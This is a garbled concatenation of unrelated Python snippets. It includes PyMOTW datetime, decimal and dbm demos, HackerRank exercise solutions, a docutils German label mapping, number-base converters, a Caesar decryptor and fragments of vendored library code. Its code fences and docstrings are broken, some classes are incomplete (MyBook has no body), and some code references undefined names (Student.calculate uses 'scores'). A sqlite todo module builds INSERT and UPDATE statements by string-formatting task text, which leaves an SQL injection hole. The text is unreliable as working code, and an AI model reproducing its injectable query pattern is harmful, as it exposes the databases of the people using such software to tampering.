    today = datetime.date.today()
    given = datetime.date(year, month, day)

    return today > given

#```


```pyComparing dates and times.```


```py

# end_pymotw_header
import datetime
import time

print("Times:")
t1 = datetime.time(12, 55, 0)
print("  t1:", t1)
t2 = datetime.time(13, 5, 0)
print("  t2:", t2)
print("  t1 < t2:", t1 < t2)

print()
print("Dates:")
d1 = datetime.date.today()
print("  d1:", d1)
d2 = datetime.date.today() + datetime.timedelta(days=1)
print("  d2:", d2)
print("  d1 > d2:", d1 > d2)

#```


```pySome basic date() methods and attributes.```


```py

# end_pymotw_header
import datetime

today = datetime.date.today()
print(today)
print("ctime  :", today.ctime())
tt = today.timetuple()
print("tuple  : tm_year  =", tt.tm_year)
print("         tm_mon   =", tt.tm_mon)
print("         tm_mday  =", tt.tm_mday)
print("         tm_hour  =", tt.tm_hour)
print("         tm_min   =", tt.tm_min)
print("         tm_sec   =", tt.tm_sec)
print("         tm_wday  =", tt.tm_wday)
print("         tm_yday  =", tt.tm_yday)
print("         tm_isdst =", tt.tm_isdst)
print("ordinal:", today.toordinal())
print("Year   :", today.year)
print("Mon    :", today.month)
print("Day    :", today.day)

```









---


```py


# end_pymotw_header
import datetime
import time

o = 733114
print("o               :", o)
print("fromordinal(o)  :", datetime.date.fromordinal(o))

t = time.time()
print("t               :", t)
print("fromtimestamp(t):", datetime.date.fromtimestamp(t))

#```


```pyCreating datetime.date() instances from other types of values.```


```py

# end_pymotw_header
import datetime
import time

o = 733114
print("o:", o)
print("fromordinal(o):", datetime.date.fromordinal(o))
t = time.time()
print("t:", t)
print("fromtimestamp(t):", datetime.date.fromtimestamp(t))

#```


```pyDemonstrate the ISO calendar features of date().```


```py

# end_pymotw_header
import datetime
import locale

day_names = [
    locale.nl_langinfo(x)
    for x in (
        locale.DAY_1,
        locale.DAY_2,
        locale.DAY_3,
        locale.DAY_4,
        locale.DAY_5,
        locale.DAY_6,
        locale.DAY_7,
        locale.DAY_1,
    )
]

print("US days :", day_names[:-1])
print("ISO days:", day_names[1:])

d = datetime.date(2007, 12, 30)
for i in range(7):
    delta = datetime.timedelta(days=i)
    date = d + delta
    print()
    print(day_names[date.weekday()], date)
    print("  ISO Weekday:", day_names[date.isoweekday()])
    print("  ISO Calendar:", date.isocalendar())

#```


```pyCalculations with dates.```


```py

# end_pymotw_header
import datetime

today = datetime.date.today()
print("Today    :", today)

one_day = datetime.timedelta(days=1)
print("One day  :", one_day)

yesterday = today - one_day
print("Yesterday:", yesterday)

tomorrow = today + one_day
print("Tomorrow :", tomorrow)

print()
print("tomorrow - yesterday:", tomorrow - yesterday)
print("yesterday - tomorrow:", yesterday - tomorrow)

#```


```pyMinimum and maximum values for dates.```


```py

# end_pymotw_header
import datetime

print("Earliest  :", datetime.date.min)
print("Latest    :", datetime.date.max)
print("Resolution:", datetime.date.resolution)

#```


```pyCreating dates from existing objects.```


```py

# end_pymotw_header
import datetime

d1 = datetime.date(2008, 3, 29)
print("d1:", d1.ctime())

d2 = d1.replace(year=2009)
print("d2:", d2.ctime())

#```


```pyCombining dates and times into a single object.```


```py

# end_pymotw_header
import datetime

print("Now    :", datetime.datetime.now())
print("Today  :", datetime.datetime.today())
print("UTC Now:", datetime.datetime.utcnow())
print()

FIELDS = ["year", "month", "day", "hour", "minute", "second", "microsecond"]

d = datetime.datetime.now()
for attr in FIELDS:
    print("{:15}: {}".format(attr, getattr(d, attr)))

```









---


```py


# end_pymotw_header
import datetime

t = datetime.time(1, 2, 3)
print("t :", t)

d = datetime.date.today()
print("d :", d)

dt = datetime.datetime.combine(d, t)
print("dt:", dt)

#```


```pyCalculations with datetime values.```


```py

# end_pymotw_header
import datetime

today = datetime.datetime.today()
print("Today    :", today)

yesterday = today - datetime.timedelta(days=1)
print("Yesterday:", yesterday)

tomorrow = today + datetime.timedelta(days=1)
print("Tomorrow :", tomorrow)

print("tomorrow - yesterday:", tomorrow - yesterday)
print("yesterday - tomorrow:", yesterday - tomorrow)

print("tomorrow > yesterday:", tomorrow > yesterday)

#```


```pyThe range of valid datetime values.```


```py

# end_pymotw_header
import datetime

print("Earliest  :", datetime.datetime.min)
print("Latest    :", datetime.datetime.max)
print("Resolution:", datetime.datetime.resolution)

```









---


```py


# end_pymotw_header
import datetime

format = "%a %b %d %H:%M:%S %Y"

today = datetime.datetime.today()
print("ISO     :", today)

s = today.strftime(format)
print("strftime:", s)

d = datetime.datetime.strptime(s, format)
print("strptime:", d.strftime(format))

```









---


```py


# end_pymotw_header
import datetime

today = datetime.datetime.today()
print("ISO     :", today)
print("format(): {:%a %b %d %H:%M:%S %Y}".format(today))

#```


```pyBasic features of time objects.```


```py

# end_pymotw_header
import datetime

t = datetime.time(1, 2, 3)
print(t)
print("hour       :", t.hour)
print("minute     :", t.minute)
print("second     :", t.second)
print("microsecond:", t.microsecond)
print("tzinfo     :", t.tzinfo)

#```


```pyValid range of time values.```


```py

# end_pymotw_header
import datetime

print("Earliest  :", datetime.time.min)
print("Latest    :", datetime.time.max)
print("Resolution:", datetime.time.resolution)

#```


```pyTime resolution.```


```py

# end_pymotw_header
import datetime

for m in [1, 0, 0.1, 0.6]:
    try:
        print("{:02.1f} :".format(m), datetime.time(0, 0, 0, microsecond=m))
    except TypeError as err:
        print("ERROR:", err)

```









---


```py


# end_pymotw_header
import datetime

print("microseconds:", datetime.timedelta(microseconds=1))
print("milliseconds:", datetime.timedelta(milliseconds=1))
print("seconds     :", datetime.timedelta(seconds=1))
print("minutes     :", datetime.timedelta(minutes=1))
print("hours       :", datetime.timedelta(hours=1))
print("days        :", datetime.timedelta(days=1))
print("weeks       :", datetime.timedelta(weeks=1))

#```


```pyCalculations with dates.```


```py

# end_pymotw_header
import datetime

one_day = datetime.timedelta(days=1)
print("1 day    :", one_day)
print("5 days   :", one_day * 5)
print("1.5 days :", one_day * 1.5)
print("1/4 day  :", one_day / 4)

# assume an hour for lunch
work_day = datetime.timedelta(hours=7)
meeting_length = datetime.timedelta(hours=1)
print("meetings per day :", work_day / meeting_length)

```









---


```py


# end_pymotw_header
import datetime

for delta in [
    datetime.timedelta(microseconds=1),
    datetime.timedelta(milliseconds=1),
    datetime.timedelta(seconds=1),
    datetime.timedelta(minutes=1),
    datetime.timedelta(hours=1),
    datetime.timedelta(days=1),
    datetime.timedelta(weeks=1),
]:
    print("{:15} = {:8} seconds".format(str(delta), delta.total_seconds()))

#```


```pyDatetime with timezone```


```py

# end_pymotw_header
import datetime

min6 = datetime.timezone(datetime.timedelta(hours=-6))
plus6 = datetime.timezone(datetime.timedelta(hours=6))
d = datetime.datetime.now(min6)

print(min6, ":", d)
print(datetime.timezone.utc, ":", d.astimezone(datetime.timezone.utc))
print(plus6, ":", d.astimezone(plus6))

# convert to the current system timezone
d_system = d.astimezone()
print(d_system.tzinfo, "      :", d_system)

from __future__ import absolute_import, division, unicode_literals

from datrie import Trie as DATrie
from pipenv.patched.notpip._vendor.six import text_type

from ._base import Trie as ABCTrie


class Trie(ABCTrie):
    def __init__(self, data):
        chars = set()
        for key in data.keys():
            if not isinstance(key, text_type):
                raise TypeError("All keys must be strings")
            for char in key:
                chars.add(char)

        self._data = DATrie("".join(chars))
        for key, value in data.items():
            self._data[key] = value

    def __contains__(self, key):
        return key in self._data

    def __len__(self):
        return len(self._data)

    def __iter__(self):
        raise NotImplementedError()

    def __getitem__(self, key):
        return self._data[key]

    def keys(self, prefix=None):
        return self._data.keys(prefix)

    def has_keys_with_prefix(self, prefix):
        return self._data.has_keys_with_prefix(prefix)

    def longest_prefix(self, prefix):
        return self._data.longest_prefix(prefix)

    def longest_prefix_item(self, prefix):
        return self._data.longest_prefix_item(prefix)

matrix = []

for x in range(6):
    matrix.append([int(x) for x in input().split()])

hourglass = []

for i, row in enumerate(matrix):
    if i >= (len(matrix) - 2):
        break
    for j, e in enumerate(row):
        if j >= (len(row) - 2):
            break
        templist = []
        templist = templist + [matrix[i][j], matrix[i][j + 1], matrix[i][j + 2]]
        templist = templist + [matrix[i + 1][j + 1]]
        templist = templist + [
            matrix[i + 2][j],
            matrix[i + 2][j + 1],
            matrix[i + 2][j + 2],
        ]
        hourglass.append(templist)

hourglasssums = [sum(eachglass) for eachglass in hourglass]
print(max(hourglasssums))

class Student(Person):
    def __init__(self, firstName, lastName, idNumber, scores):
        Person.__init__(self, firstName, lastName, idNumber)
        self.scores = scores

    def calculate(self):
        average = sum(scores) / len(scores)
        if 90 <= average <= 100:
            return "O"
        if 80 <= average <= 90:
            return "E"
        if 70 <= average <= 80:
            return "A"
        if 55 <= average <= 70:
            return "P"
        if 40 <= average <= 55:
            return "D"
        if average < 40:
            return "T"

from abc import ABCMeta, abstractmethod
class Book(object, metaclass=ABCMeta):
    def __init__(self,title,author):
        self.title=title
        self.author=author
    @abstractmethod
    def display(): pass

class MyBook(Book):


title=input()
author=input()
price=int(input())
new_novel=MyBook(title,author,price)
new_novel.display()
i = 4
d = 4.0
s = "HackerRank"


# Declare second integer, double, and String variables.
# Read and save an integer, double, and String to your variables.
i2 = int(input())
d2 = float(input())
s2 = str(input())
# Print the sum of both integer variables on a new line.
print(i + i2)
# Print the sum of the double variables on a new line.
print(d + d2)
# Concatenate and print the String variables on a new line
# The 's' variable above should be printed first.
print(s + s2)

mealCost = float(input())
tipPercent = int(input())
taxPercent = int(input())

totalCost = mealCost + (mealCost * (tipPercent / 100)) + (mealCost * (taxPercent / 100))

print("The total meal cost is", round(totalCost), "dollars.")

if __name__ == "__main__":
    n = int(input())

    if n % 2 == 0:
        if (n >= 2) and (n <= 5):
            print("Not Weird")
        if (n >= 6) and (n <= 20):
            print("Weird")
        if n > 20:
            print("Not Weird")
    else:
        print("Weird")

class BinarySearchTree:
    def __init__(self, value):
        self.value = value
        self.left = None
        self.right = None

    def insert(self, value):
        if value < self.value:
            if not self.left:
                self.left = BinarySearchTree(value)
            else:
                # recursively continues until we find an empty spot
                self.left.insert(value)
        else:
            if not self.right:
                self.right = BinarySearchTree(value)
            else:
                self.right.insert(value)

    def contains(self, target):
        if self.value == target:
            return True

        if target < self.value:
            # we know to go left
            if not self.left:
                # if there are no further left side nodes to search, it isn't here
                return False
            else:
                # recursively search the rest
                return self.left.contains(target)

        else:
            # we know to go right
            if not self.right:
                return False
            else:
                return self.right.contains(target)

    def get_max(self):
        if not self:
            return None
        if not self.right:
            return self.value
        else:
            return self.right.get_max()

    def for_each(self, cb):
        cb(self.value)

        if self.left:
            self.left.for_each(cb)
        if self.right:
            self.right.for_each(cb)

# This input is provided in the challenge.
t = int(input())
for i in range(0, t):
    age = int(input())
    p = Person(age)
    p.amIOld()
    for j in range(0, 3):
        p.yearPasses()
    p.amIOld()
    print("")


class Person:
    def __init__(self, initialAge):
        # Add some more code to run some checks on initialAge
        if initialAge < 0:
            self.age = 0
            print("Age is not valid, setting age to 0.")
        else:
            self.age = initialAge

    def amIOld(self):
        # Do some computations in here and print out the correct statement to the console
        if self.age < 13:
            print("You are young.")
        if self.age >= 13 and self.age < 18:
            print("You are a teenager.")
        if self.age >= 18:
            print("You are old.")

    def yearPasses(self):
        # Increment the age of the person in here
        self.age += 1

t = int(input())

for i in range(t):
    s = input()
    s1 = "".join([s[i] for i in range(len(s)) if i % 2 == 0])
    s2 = "".join([s[i] for i in range(len(s)) if i % 2 != 0])
    print(s1, s2)

#!/bin/python3

import sys


n = int(input().strip())
arr = [int(arr_temp) for arr_temp in input().strip().split(" ")]

arr.reverse()

arrstring = " ".join(str(e) for e in arr)

print(arrstring)

def getphonebook(n):
    phonebook = {}
    for x in range(n):
        line = input().strip().split(" ")
        name = line[0]
        number = line[1]
        phonebook[name] = number
    return phonebook


if __name__ == "__main__":
    numberofentries = int(input())
    phonebook = getphonebook(numberofentries)

    while True:
        try:
            name = input()
            if name in phonebook.keys():
                print(name, "=", phonebook[name], sep="")
            else:
                print("Not found")
        except EOFError as eof:
            break

def factorial(n):
    if n <= 1:
        return 1
    else:
        return n * factorial(n - 1)


if __name__ == "__main__":
    n = factorial(int(input()))

    print(n)

# We assume that given dates are correct
# and
# solved for problem set in cs course on udacity.com

from calendar import isleap


def daysBetweenDates(year1, month1, day1, year2, month2, day2):
    dom = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    domleap = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    if isleap(year1) and isleap(year2):
        e1 = sum(domleap) + sum(domleap[: month1 - 1]) + day1
        e2 = sum(domleap) + sum(domleap[: month2 - 1]) + day2
        return e2 - e1

    days = 0
    if isleap(year1):
        days += (sum(domleap[month1 - 1 :]) - day1) + sum(dom[: month2 - 1]) + day2
    elif isleap(year2):
        days += (sum(dom[month1 - 1 :]) - day1) + sum(domleap[: month2 - 1]) + day2
    else:
        days += (sum(dom[month1 - 1 :]) - day1) + sum(dom[: month2 - 1]) + day2
    for year in range(year1 + 1, year2):
        if isleap(year):
            days += sum(domleap)
        else:
            days += sum(dom)
    return days

import sqlite3


def execute_query(sql_query):
    with sqlite3.connect("todo.db") as conn:
        cur = conn.cursor()
        result = cur.execute(sql_query)
        conn.commit()
    return result


def add_new_task(task):
    sql_query = "INSERT INTO Todo(task, complete) VALUES('%s', %s) " % (task, 0)
    execute_query(sql_query)


def get_complete_tasks():
    sql_query = "SELECT task FROM Todo WHERE complete=%s " % (1)
    complete = execute_query(sql_query)
    return [task[0] for task in complete.fetchall()]


def get_incomplete_tasks():
    sql_query = "SELECT task FROM Todo WHERE complete=%s " % (0)
    incomplete = execute_query(sql_query)
    return [task[0] for task in incomplete.fetchall()]


def mark_task_complete(task):
    sql_query = "UPDATE Todo SET complete=%s WHERE task='%s' and complete=%s" % (
        1,
        task,
        0,
    )
    execute_query(sql_query)

```









---


```py


# end_pymotw_header
import dbm

with dbm.open("/tmp/example.db", "r") as db:
    print("keys():", db.keys())
    for k in db.keys():
        print("iterating:", k, db[k])
    print('db["author"] =', db["author"])

```









---


```py


# end_pymotw_header
import dbm

with dbm.open("/tmp/example.db", "w") as db:
    try:
        db[1] = "one"
    except TypeError as err:
        print(err)

```









---


```py


# end_pymotw_header
import dbm

with dbm.open("/tmp/example.db", "w") as db:
    try:
        db["one"] = 1
    except TypeError as err:
        print(err)

```









---


```py


# end_pymotw_header
import dbm

with dbm.open("/tmp/example.db", "n") as db:
    db["key"] = "value"
    db["today"] = "Sunday"
    db["author"] = "Doug"

# $Id: de.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Gunnar Schwant <g.schwant@gmx.de>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
German language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    "author": "Autor",
    "authors": "Autoren",
    "organization": "Organisation",
    "address": "Adresse",
    "contact": "Kontakt",
    "version": "Version",
    "revision": "Revision",
    "status": "Status",
    "date": "Datum",
    "dedication": "Widmung",
    "copyright": "Copyright",
    "abstract": "Zusammenfassung",
    "attention": "Achtung!",
    "caution": "Vorsicht!",
    "danger": "!GEFAHR!",
    "error": "Fehler",
    "hint": "Hinweis",
    "important": "Wichtig",
    "note": "Bemerkung",
    "tip": "Tipp",
    "warning": "Warnung",
    "contents": "Inhalt",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    "autor": "author",
    "autoren": "authors",
    "organisation": "organization",
    "adresse": "address",
    "kontakt": "contact",
    "version": "version",
    "revision": "revision",
    "status": "status",
    "datum": "date",
    "copyright": "copyright",
    "widmung": "dedication",
    "zusammenfassung": "abstract",
}```


```pyGerman (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

# Morgans Formula In Algebra Set operations
# number(set A) + number(set B) - number(set A interaction B)
# n(a)+ n(b) - n(anb)
# you can add sets or increase the number elements of sets The formula still works

a = {1, 23, 55, 76, 13, 90, 34, 78}
b = {12, 345, 8, 4, 0, 7, 4, 3, 53, 4, 6, 3}

abInteraction = a & b  # & operator interacts two sets
abUnion = a | b  # | operator makes union of two sets

eqn = len(a) + len(b) - len(abInteraction)
print(str(eqn) + " = " + str(len(abUnion)))

import os

# If DISTUTILS_DEBUG is anything other than the empty string, we run in
# debug mode.
DEBUG = os.environ.get("DISTUTILS_DEBUG")

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

with decimal.localcontext() as c:
    c.prec = 2
    print("Local precision:", c.prec)
    print("3.14 / 3 =", (decimal.Decimal("3.14") / 3))

print()
print("Default precision:", decimal.getcontext().prec)
print("3.14 / 3 =", (decimal.Decimal("3.14") / 3))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

fmt = "{0:<25} {1:<25}"

print(fmt.format("Input", "Output"))
print(fmt.format("-" * 25, "-" * 25))

# Integer
print(fmt.format(5, decimal.Decimal(5)))

# String
print(fmt.format("3.14", decimal.Decimal("3.14")))

# Float
f = 0.1
print(fmt.format(repr(f), decimal.Decimal(str(f))))
print("{:<0.23g} {:<25}".format(f, str(decimal.Decimal.from_float(f))[:25]))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

d = decimal.Decimal(1.1)
print("Precision:")
print("{:.1}".format(d))
print("{:.2}".format(d))
print("{:.3}".format(d))
print("{:.18}".format(d))

print("\nWidth and precision combined:")
print("{:5.1f} {:5.1g}".format(d, d))
print("{:5.2f} {:5.2g}".format(d, d))
print("{:5.2f} {:5.2g}".format(d, d))

print("\nZero padding:")
print("{:05.1}".format(d))
print("{:05.2}".format(d))
print("{:05.3}".format(d))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

context = decimal.getcontext()

print("Emax     =", context.Emax)
print("Emin     =", context.Emin)
print("capitals =", context.capitals)
print("prec     =", context.prec)
print("rounding =", context.rounding)
print("flags    =")
for f, v in context.flags.items():
    print("  {}: {}".format(f, v))
print("traps    =")
for t, v in context.traps.items():
    print("  {}: {}".format(t, v))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

# Set up a context with limited precision
c = decimal.getcontext().copy()
c.prec = 3

# Create our constant
pi = c.create_decimal("3.1415")

# The constant value is rounded off
print("PI    :", pi)

# The result of using the constant uses the global context
print("RESULT:", decimal.Decimal("2.01") * pi)
````

````py
Isolate the Decimal part of a Number
https://stackoverflow.com/questions/3886402/how-to-get-numbers-after-decimal-point```


```py


def decimal_isolate(number, digitAmount):

    """
    Isolates the decimal part of a number.
    If digitAmount > 0 round to that decimal place, else print the entire decimal.
    >>> decimal_isolate(1.53, 0)
    0.53
    >>> decimal_isolate(35.345, 1)
    0.3
    >>> decimal_isolate(35.345, 2)
    0.34
    >>> decimal_isolate(35.345, 3)
    0.345
    >>> decimal_isolate(-14.789, 3)
    -0.789
    >>> decimal_isolate(0, 2)
    0
    >>> decimal_isolate(-14.123, 1)
    -0.1
    >>> decimal_isolate(-14.123, 2)
    -0.12
    >>> decimal_isolate(-14.123, 3)
    -0.123
    """
    if digitAmount > 0:
        return round(number - int(number), digitAmount)
    return number - int(number)


if __name__ == "__main__":
    print(decimal_isolate(1.53, 0))
    print(decimal_isolate(35.345, 1))
    print(decimal_isolate(35.345, 2))
    print(decimal_isolate(35.345, 3))
    print(decimal_isolate(-14.789, 3))
    print(decimal_isolate(0, 2))
    print(decimal_isolate(-14.123, 1))
    print(decimal_isolate(-14.123, 2))
    print(decimal_isolate(-14.123, 3))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

d = decimal.Decimal(100)
print("d     :", d)
print("log10 :", d.log10())
print("ln    :", d.ln())

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

a = decimal.Decimal("5.1")
b = decimal.Decimal("3.14")
c = 4
d = 3.14

print("a     =", repr(a))
print("b     =", repr(b))
print("c     =", repr(c))
print("d     =", repr(d))
print()

print("a + b =", a + b)
print("a - b =", a - b)
print("a * b =", a * b)
print("a / b =", a / b)
print()

print("a + c =", a + c)
print("a - c =", a - c)
print("a * c =", a * c)
print("a / c =", a / c)
print()

print("a + d =", end=" ")
try:
    print(a + d)
except TypeError as e:
    print(e)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

d = decimal.Decimal("0.123456")

for i in range(1, 5):
    decimal.getcontext().prec = i
    print(i, ":", d, d * 1)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

context = decimal.getcontext()

ROUNDING_MODES = [
    "ROUND_CEILING",
    "ROUND_DOWN",
    "ROUND_FLOOR",
    "ROUND_HALF_DOWN",
    "ROUND_HALF_EVEN",
    "ROUND_HALF_UP",
    "ROUND_UP",
    "ROUND_05UP",
]

header_fmt = "{:10} " + " ".join(["{:^8}"] * 6)

print(
    header_fmt.format(
        " ", "1/8 (1)", "-1/8 (1)", "1/8 (2)", "-1/8 (2)", "1/8 (3)", "-1/8 (3)"
    )
)
for rounding_mode in ROUNDING_MODES:
    print("{0:10}".format(rounding_mode.partition("_")[-1]), end=" ")
    for precision in [1, 2, 3]:
        context.prec = precision
        context.rounding = getattr(decimal, rounding_mode)
        value = decimal.Decimal(1) / decimal.Decimal(8)
        print("{0:^8}".format(value), end=" ")
        value = decimal.Decimal(-1) / decimal.Decimal(8)
        print("{0:^8}".format(value), end=" ")
    print()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

for value in ["Infinity", "NaN", "0"]:
    print(decimal.Decimal(value), decimal.Decimal("-" + value))
print()

# Math with infinity
print("Infinity + 1:", (decimal.Decimal("Infinity") + 1))
print("-Infinity + 1:", (decimal.Decimal("-Infinity") + 1))

# Print comparing NaN
print(decimal.Decimal("NaN") == decimal.Decimal("Infinity"))
print(decimal.Decimal("NaN") != decimal.Decimal(1))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal
import threading
from queue import PriorityQueue


class Multiplier(threading.Thread):
    def __init__(self, a, b, prec, q):
        self.a = a
        self.b = b
        self.prec = prec
        self.q = q
        threading.Thread.__init__(self)

    def run(self):
        c = decimal.getcontext().copy()
        c.prec = self.prec
        decimal.setcontext(c)
        self.q.put((self.prec, a * b))


a = decimal.Decimal("3.14")
b = decimal.Decimal("1.234")
# A PriorityQueue will return values sorted by precision,
# no matter what order the threads finish.
q = PriorityQueue()
threads = [Multiplier(a, b, i, q) for i in range(1, 6)]
for t in threads:
    t.start()

for t in threads:
    t.join()

for i in range(5):
    prec, value = q.get()
    print("{}  {}".format(prec, value))
````

```pyConvert a Decimal Number to a Binary Number."""


def decimal_to_binary(num: int) -> str:

    """
    Convert an Integer Decimal Number to a Binary Number as str.
    >>> decimal_to_binary(0)
    '0b0'
    >>> decimal_to_binary(2)
    '0b10'
    >>> decimal_to_binary(7)
    '0b111'
    >>> decimal_to_binary(35)
    '0b100011'
    >>> # negatives work too
    >>> decimal_to_binary(-2)
    '-0b10'
    >>> # other floats will error
    >>> decimal_to_binary(16.16) # doctest: +ELLIPSIS
    Traceback (most recent call last):
    ...
    TypeError: 'float' object cannot be interpreted as an integer
    >>> # strings will error as well
    >>> decimal_to_binary('0xfffff') # doctest: +ELLIPSIS
    Traceback (most recent call last):
    ...
    TypeError: 'str' object cannot be interpreted as an integer
    """

    if isinstance(num, float):
        raise TypeError("'float' object cannot be interpreted as an integer")
    if isinstance(num, str):
        raise TypeError("'str' object cannot be interpreted as an integer")

    if num == 0:
        return "0b0"

    negative = False

    if num < 0:
        negative = True
        num = -num

    binary: list[int] = []
    while num > 0:
        binary.insert(0, num % 2)
        num >>= 1

    if negative:
        return "-0b" + "".join(str(e) for e in binary)

    return "0b" + "".join(str(e) for e in binary)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# For concatenation
def concat(S):
    res = ""
    for i in S:
        if not isinstance(i, str):
            res += str(i)
        else:
            res += i
    return res


# Simple Base 10 number(Decimal) number converter to Base 2 number(binary) number
# Function returns answer in str datatype
# For understanding steps: http://www.electronics-tutorials.ws/binary/bin_2.html
def decimal_to_binary(n):
    res = []
    while n != 0:
        res.append(n % 2)
        n = n // 2
    final = concat(res) + "0"
    return final[::-1]


# Test
cases = [123, 23455, 253552, 87985, 3479434, 76, 246572, 231, 69, 2, 7, 2, 543]
for case in cases:
    built_in = str(bin(case))[2:]
    my_func = decimal_to_binary(case)[1:]  # For test purposes
    if built_in == my_func:
        print("Decimal: " + str(case))
        print("Binary: " + my_func + "\nTest Passed!\n")
    else:
        print("Test Failed! Badly!!\n")

def binary_recursive(decimal: int) -> str:
    """
    Take a positive integer value and return its binary equivalent.
    >>> binary_recursive(1000)
    '1111101000'
    >>> binary_recursive("72")
    '1001000'
    >>> binary_recursive("number")
    Traceback (most recent call last):
    ...
    ValueError: invalid literal for int() with base 10: 'number'
    """
    decimal = int(decimal)
    if decimal in (0, 1):  # Exit cases for the recursion
        return str(decimal)
    div, mod = divmod(decimal, 2)
    return binary_recursive(div) + str(mod)


def main(number: str) -> str:
    """
    Take an integer value and raise ValueError for wrong inputs,
    call the function above and return the output with prefix "0b" & "-0b"
    for positive and negative integers respectively.
    >>> main(0)
    '0b0'
    >>> main(40)
    '0b101000'
    >>> main(-40)
    '-0b101000'
    >>> main(40.8)
    Traceback (most recent call last):
    ...
    ValueError: Input value is not an integer
    >>> main("forty")
    Traceback (most recent call last):
    ...
    ValueError: Input value is not an integer
    """
    number = str(number).strip()
    if not number:
        raise ValueError("No input value was provided")
    negative = "-" if number.startswith("-") else ""
    number = number.lstrip("-")
    if not number.isnumeric():
        raise ValueError("Input value is not an integer")
    return f"{negative}0b{binary_recursive(int(number))}"


if __name__ == "__main__":
    from doctest import testmod

    testmod()
```

````pyConvert a Decimal Number to an Octal Number."""

import math

# Modified from:
# https://github.com/TheAlgorithms/Javascript/blob/master/Conversions/DecimalToOctal.js


def decimal_to_octal(num: int) -> str:
    """Convert a Decimal Number to an Octal Number.

    >>> all(decimal_to_octal(i) == oct(i) for i
    ...     in (0, 2, 8, 64, 65, 216, 255, 256, 512))
    True
    """
    octal = 0
    counter = 0
    while num > 0:
        remainder = num % 8
        octal = octal + (remainder * math.floor(math.pow(10, counter)))
        counter += 1
        num = math.floor(num / 8)  # basically /= 8 without remainder if any
        # This formatting removes trailing '.0' from `octal`.
    return f"0o{int(octal)}"


def main() -> None:
    """Print octal equivalents of decimal numbers."""
    print("\n2 in octal is:")
    print(decimal_to_octal(2))  # = 2
    print("\n8 in octal is:")
    print(decimal_to_octal(8))  # = 10
    print("\n65 in octal is:")
    print(decimal_to_octal(65))  # = 101
    print("\n216 in octal is:")
    print(decimal_to_octal(216))  # = 330
    print("\n512 in octal is:")
    print(decimal_to_octal(512))  # = 1000
    print("\n")


if __name__ == "__main__":
    main()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import decimal

# Tuple
t = (1, (1, 1), -2)
print("Input  :", t)
print("Decimal:", decimal.Decimal(t))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import functools


def log(func):
    @functools.wraps(func)
    def wrapper(*args, **kw):
        print("call %s():" % func.__name__)
        return func(*args, **kw)

    return wrapper


@log
def now():
    print("2015-3-25")


now()


def logger(text):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kw):
            print("%s %s():" % (text, func.__name__))
            return func(*args, **kw)

        return wrapper

    return decorator


@logger("DEBUG")
def today():
    print("2015-3-25")


today()
print(today.__name__)

def decrypt(msg, MORSE_CODE_DICTIONARY):
    li1 = list(MORSE_CODE_DICTIONARY.keys())
    li2 = list(MORSE_CODE_DICTIONARY.values())
    dic = dict()
    for i, j in zip(li1, li2):
        dic[j] = i
    if msg[len(msg) - 1] == " ":
        msg = msg[:-1]
    wordlist = msg.split(" / ")
    LetterList = list()
    DecryptedMessage = list()
    for i in wordlist:
        Word = ""
        LetterList = i.split(" ")
        for j in LetterList:
            if j not in li2:
                print(j)
                DecryptedMessage.clear()
                DecryptedMessage.append("INVALID MORSE CODE!!")
                return DecryptedMessage
            Word = Word + dic[j]
        DecryptedMessage.append(Word)
        Word = ""
    return DecryptedMessage

import string

# Note: this decryption function is designed to decrypt messages encrypted by encryption function i wrote(avaliable in this repo)


def concat_elements(n):
    res = ""
    for i in n:
        res += i
    return res


def decrypt(message, key):
    string_chars = (
        list(string.ascii_uppercase)
        + list(string.ascii_lowercase)
        + list(string.digits)
        + list(string.punctuation)
        + [" "]
    )
    try:
        splitted_message = list(message)
    except TypeError:
        return "Expected an string for text!"

    for char in splitted_message:
        try:
            tmp = string_chars[string_chars.index(char) - key]
        except IndexError:
            tmp_key = (string_chars.index(char) + key) + len(string_chars)
            tmp = string_chars[tmp_key]
        splitted_message[splitted_message.index(char)] = tmp

    final = concat_elements(splitted_message)
    return final


def decrypt_generator(message, n):
    # range(0, 96) because len(string_chars) == 95
    for i in range(0, n + 1):
        case = decrypt(message, i)
        yield case


# Test
test_case = "lq01Ir1I2xyI1ncrn2*"
result = decrypt(test_case, 9)
print("Decrypted Text: " + result, "\n")

_result = list(decrypt_generator(test_case, 95))
for res in _result:
    print("Possible text: " + res)
# Look at ninth result

from typing import Iterable, Set

from prompt_toolkit.document import Document

from .base import CompleteEvent, Completer, Completion

__all__ = ["DeduplicateCompleter"]


class DeduplicateCompleter(Completer):
    """
    Wrapper around a completer that removes duplicates. Only the first unique
    completions are kept.

